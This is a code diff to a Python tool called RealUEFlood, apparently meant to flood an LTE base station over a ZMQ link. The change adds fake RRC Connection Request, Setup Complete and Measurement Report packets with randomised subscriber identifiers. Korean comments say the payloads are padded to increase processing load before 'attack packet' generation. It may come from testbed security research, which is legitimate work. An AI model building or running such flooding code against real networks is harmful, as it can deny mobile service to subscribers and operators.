@@ -14,7 +14,7 @@ import re
 from datetime import datetime
 
 class RealUEFlood:
-    def __init__(self, target_port=2001):
+    def __init__(self, target_port=2005):
         self.target_port = target_port
         self.context = zmq.Context()
         self.running = False
@@ -305,8 +305,58 @@ class RealUEFlood:
         # 실제 UE 패킷 캡처
         if not self.capture_real_ue_packets(10):
             self.log_message("실제 UE 패킷 캡처 실패 - 기본 패킷 사용")
-            # 기본 패킷 생성
-            self.real_packets[0x0001] = [b'\x00\x01' + b'\x00' * 50]
+            # 실제 RRC 메시지 형식으로 기본 패킷 생성
+            self.real_packets[0x0001] = [
+                # RRC Connection Request (더 큰 크기로 처리 부담 증가)
+                struct.pack('>H', 0x0001) +  # Message Type
+                struct.pack('>I', 1001) +     # UE Identity
+                struct.pack('>H', 0x0001) +   # Establishment Cause
+                struct.pack('>H', 0x0000) +   # Spare
+                struct.pack('>Q', 1234567890123456) +  # IMSI
+                struct.pack('>I', 123456) +   # TMSI
+                struct.pack('>H', 12345) +    # LAI
+                struct.pack('>B', 0x01) +     # RRC State
+                struct.pack('>I', 123456) +   # Cell ID
+                struct.pack('>H', 12345) +    # Tracking Area Code
+                # 더 많은 복잡한 필드 추가
+                struct.pack('>I', 0x12345678) +  # RRC Transaction ID
+                struct.pack('>H', 0x0000) +      # Criticality
+                struct.pack('>H', 0x0000) +      # Spare
+                struct.pack('>Q', random.randint(1000000000000000, 9999999999999999)) +  # 추가 IMSI
+                struct.pack('>I', random.randint(1, 1000000)) +  # 추가 TMSI
+                struct.pack('>H', random.randint(1, 65535)) +    # 추가 LAI
+                struct.pack('>B', random.randint(1, 255)) +     # 추가 상태
+                struct.pack('>I', random.randint(1, 1000000)) +  # 추가 Cell ID
+                struct.pack('>H', random.randint(1, 65535)) +   # 추가 TAC
+                b'\x00' * 200  # 더 큰 페이로드
+            ]
+            
+            self.real_packets[0x0003] = [
+                # RRC Connection Setup Complete
+                struct.pack('>H', 0x0003) +  # Message Type
+                struct.pack('>I', 1001) +     # UE Identity
+                struct.pack('>H', 0x0000) +   # Spare
+                struct.pack('>H', 0x0041) +   # NAS Message Type
+                struct.pack('>I', 123456) +   # NAS Transaction ID
+                struct.pack('>B', 0x01) +     # NAS Security Header
+                struct.pack('>B', 0x00) +     # NAS Spare
+                b'\x00' * 300  # 더 큰 페이로드
+            ]
+            
+            self.real_packets[0x0005] = [
+                # RRC Measurement Report
+                struct.pack('>H', 0x0005) +  # Message Type
+                struct.pack('>I', 1001) +     # UE Identity
+                struct.pack('>H', 12345) +   # Cell ID 1
+                struct.pack('>B', 0x8C) +     # RSRP (-100)
+                struct.pack('>B', 0xF6) +     # RSRQ (-10)
+                struct.pack('>B', 0x64) +     # SINR (100)
+                struct.pack('>H', 12346) +   # Cell ID 2
+                struct.pack('>B', 0x8D) +     # RSRP (-99)
+                struct.pack('>B', 0xF7) +     # RSRQ (-9)
+                struct.pack('>B', 0x63) +     # SINR (99)
+                b'\x00' * 400  # 더 큰 페이로드
+            ]
         
         # 공격 패킷 생성
         attack_packets = self.generate_attack_packets()
